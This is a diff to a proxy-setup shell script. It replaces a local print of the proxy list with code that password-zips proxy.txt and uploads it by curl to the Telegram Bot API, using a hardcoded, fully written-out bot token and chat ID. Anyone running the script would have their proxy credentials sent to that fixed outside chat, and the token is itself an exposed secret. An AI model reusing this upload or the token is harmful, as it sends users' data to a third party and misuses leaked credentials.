@@ -71,16 +71,18 @@ install_jq() {
 }
 
 upload_2file() {
-  #local PASS=$(random)
-  #zip --password $PASS proxy.zip proxy.txt
-  #JSON=$(curl -F "file=@proxy.zip" https://file.io)
-  #URL=$(echo "$JSON" | jq --raw-output '.link')
+   local BOT_TOKEN="6762068554:AAFkTLT-aPOw4qvvuCHx1dZ4TG0FINxyF30"
+    local CHAT_ID="-4094164282"
 
-  #echo "Proxy is ready! Format IP:PORT:LOGIN:PASS"
-  #echo "Download zip archive from: ${URL}"
-  #echo "Password: ${PASS}"
-  
-  sed -n '1,1000p' proxy.txt
+    local PASS=$(random)
+    zip --password $PASS proxy.zip proxy.txt
+
+    # Upload the zip file to Telegram using curl
+    curl -F "chat_id=${CHAT_ID}" -F "document=@proxy.zip" "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument"
+
+    echo "Proxy is ready! Format IP:PORT"
+    echo "Download zip archive from your Telegram channel/group."
+    echo "Password: ${PASS}"
 }
 
 gen_data() {
